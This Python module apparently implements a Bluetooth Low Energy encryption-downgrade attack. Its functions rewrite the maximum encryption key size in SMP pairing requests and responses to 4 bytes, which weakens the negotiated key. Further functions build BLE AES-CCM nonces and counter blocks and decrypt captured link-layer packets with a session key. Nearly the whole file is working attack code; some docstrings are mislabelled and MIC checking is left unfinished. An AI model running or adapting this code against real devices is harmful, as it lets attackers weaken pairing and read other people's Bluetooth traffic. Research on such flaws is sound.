from Crypto.Cipher import AES


_SMP_CID = 0x0006
_SMP_PAIRING_REQ = 0x01
_SMP_PAIRING_RSP = 0x02




def _rewrite_ll_l2cap_smp(ll_body: bytes, new_key_size: int = 0x04):
    """
    Rewrites SMP Pairing Req/Resp max enc size to new_key_size.
    """
    if len(ll_body) < 4:
        return ll_body, False

    llid = ll_body[0] & 0x03
    length = ll_body[1]
    # must have the whole payload present
    if llid != 0x02 or len(ll_body) < 2 + length or length < 4:
        return ll_body, False

    # L2CAP header starts at offset 2
    l2cap = bytearray(ll_body[2:2+length])
    l2len = l2cap[0] | (l2cap[1] << 8)
    cid   = l2cap[2] | (l2cap[3] << 8)

    # must be SMP CID and enough payload for Pairing Req/Rsp (len >= 7)
    if cid != _SMP_CID or l2len < 7 or len(l2cap) < 4 + l2len:
        return ll_body, False

    smp = bytearray(l2cap[4:4+l2len])
    smp_code = smp[0]
    if smp_code not in (_SMP_PAIRING_REQ, _SMP_PAIRING_RSP):
        return ll_body, False

    # Byte 4 of SMP Pairing Req/Rsp is Max Encryption Key Size
    if smp[4] == new_key_size:
        return ll_body, False  # nothing to change

    smp[4] = new_key_size
    l2cap[4:4+l2len] = smp

    # Reassemble LL body: [hdr,len] + L2CAP(payload)
    new_ll = bytearray(ll_body)
    new_ll[2:2+length] = l2cap  # length unchanged
    return bytes(new_ll), True


def  downgrade_pairing_response(packet_bytes: bytes, new_key_size: int = 0x04):
    """
    Downgrade entropy in the SMP Pairing Response packet by chaning max enc siwe to new_key_size
    """
    if len(packet_bytes) < 4:
        return packet_bytes, False
    event = packet_bytes[:2]
    ll_body = packet_bytes[2:]
    ll_body2, changed = _rewrite_ll_l2cap_smp(ll_body, new_key_size)
    return (event + ll_body2), changed


def downgrade_pairing_request(ll_body: bytes, new_key_size: int = 0x04):
    """
    Downgrade entropy in the SMP Pairing Response packet by chaning max enc siwe to new_key_size
    """
    return _rewrite_ll_l2cap_smp(ll_body, new_key_size)


def mask_ll_header_first_octet(hdr0: int) -> int:
    # Zero NESN, SN, MD bits (2,3,4)
    return hdr0 & ~0x1C



def aes128_ecb_encrypt(key: bytes, block: bytes) -> bytes:
    """
    AES-128 ECB encrypt a single 16-byte block with a 16-byte key.
    Returns the 16-byte ciphertext block.
    """
    if len(key) != 16:
        raise ValueError(f"AES-128 key must be 16 bytes, got {len(key)}")
    if len(block) != 16:
        raise ValueError(f"Plaintext block must be 16 bytes, got {len(block)}")
    cipher = AES.new(key, AES.MODE_ECB)
    return cipher.encrypt(block)


def ble_ccm_encrypt(key: bytes,
                    nonce: bytes,
                    header_first_octet: int,
                    payload: bytes) -> tuple[bytes, bytes]:
    """
    Encrypt BLE LL payload compute MIC using AES-CCM.
    """
    assert len(key) == 16
    assert 7 <= len(nonce) <= 13      
    masked = mask_ll_header_first_octet(header_first_octet)

    cipher = AES.new(key,
                     AES.MODE_CCM,
                     nonce=nonce,
                     mac_len=4)       
    cipher.update(bytes([masked]))    

    ciphertext = cipher.encrypt(payload)
    tag = cipher.digest()             
    return ciphertext, tag

def make_ble_ccm_nonce(iv: bytes, packet_counter: int, direction_bit: int) -> bytes:
    """
    Construct the 13-byte BLE CCM nonce, nonce is provided LSO -> MSO (not as in the SPEC, but same convention as NIMBLE)
    """
    if not (0 <= packet_counter < (1 << 39)):
        raise ValueError("packet_counter must fit in 39 bits")
    if direction_bit not in (0, 1):
        raise ValueError("direction_bit must be 0 or 1")
    if len(iv) != 8:
        raise ValueError("iv must be exactly 8 bytes")

    # Lower 32 bits of packetCounter
    # Should have LSO of counter at nonce0 and second MSO at nonce3 (SPEC p2768) 
    n0 = (packet_counter >> 0) & 0xFF
    n1 = (packet_counter >> 8) & 0xFF
    n2 = (packet_counter >> 16) & 0xFF
    n3 = (packet_counter >> 24) & 0xFF

    # Upper 7 bits of packetCounter + direction in MSB forms nonce4 (SPEC p2768) 
    pc_high7 = (packet_counter >> 32) & 0x7F
    n4 = pc_high7 | (direction_bit << 7)

    # Should have MSO of IV at nonce12 and LSO at nonce5 (SPEC p2768) 
    # Index 0 is nonce0, index 13 is nonce 13 (SPEC p2768)
    return bytes([n0, n1, n2, n3, n4]) + iv


def make_ble_ccm_counter_block(nonce: bytes, block_index: int) -> bytes:
    """
    Construct the 16-byte AES-CTR counter block A_i used by AES-CCM in BLE.
    """
    if len(nonce) != 13:
        raise ValueError("nonce must be exactly 13 bytes for BLE CCM")
    if not (0 <= block_index <= 0xFFFF):
        raise ValueError("block_index must fit in 16 bits")

    L = 15 - len(nonce)   # BLE => 2
    flags = (L - 1)       # BLE => 0x01
    
    ctr_msb = (block_index >> 8) & 0xFF  # A[14]
    ctr_lsb = block_index & 0xFF         # A[15]
    
    # nonce should have nonce0 at position 1 and nonce13 at position 14 (SPEC p2769)
    return bytes([flags]) + nonce + bytes([ctr_msb, ctr_lsb])
    


MIC_LEN = 4  # BLE uses 4-byte MIC

def decrypt_encrypted_pdu(session_key: bytes,
                          iv: bytes,
                          packet_counter: int,
                          direction_bit: int,
                          pdu: bytes):
    """
    Decrypt one BLE encrypted LL Data PDU
    Returns plaintext_bytes or None
    """

    if len(pdu) < 2:
        print("[DECRYPT] PDU too short")
        return None

    hdr0 = pdu[0]
    length = pdu[1]

    if length == 0:
        print("[DECRYPT] Empty packet: should not be detected to decrypt")
        return None

    if len(pdu) < 2 + length:
        print(f"[DECRYPT] PDU truncated: len(pdu)={len(pdu)}, header length={length}")
        return None

    payload_plus_mic = pdu[2:2 + length]

    if len(payload_plus_mic) <= MIC_LEN:
        print("[DECRYPT] payload too short: no data, only MIC (Something went wrong)")
        return None

    ciphertext = payload_plus_mic[:-MIC_LEN]
    mic_encrypted = payload_plus_mic[-MIC_LEN:]

    # Build nonce 
    nonce = make_ble_ccm_nonce(iv, packet_counter, direction_bit)

    #
    plaintext = bytearray()
    block_index = 1   
    offset = 0

    while offset < len(ciphertext):
        block = ciphertext[offset:offset + 16]

        counter_block = make_ble_ccm_counter_block(nonce, block_index=block_index)
        keystream_block = aes128_ecb_encrypt(session_key, counter_block)

        # For the last partial block, only XOR the bytes we actually have
        k = keystream_block[:len(block)]
        plaintext.extend(c ^ b for c, b in zip(block, k))

        offset += len(block)
        block_index += 1

    pt_bytes = bytes(plaintext)

    print(
        f"[DECRYPT] dir={'P->C' if direction_bit == 0 else 'C->P'}, "
        f"ctr={packet_counter}, ct_len={len(ciphertext)}, pt_len={len(pt_bytes)}"
    )

    # TODO: check MIC to make sure the data packet is valid (Do not increase counter I think for a wrong packet)

    return pt_bytes
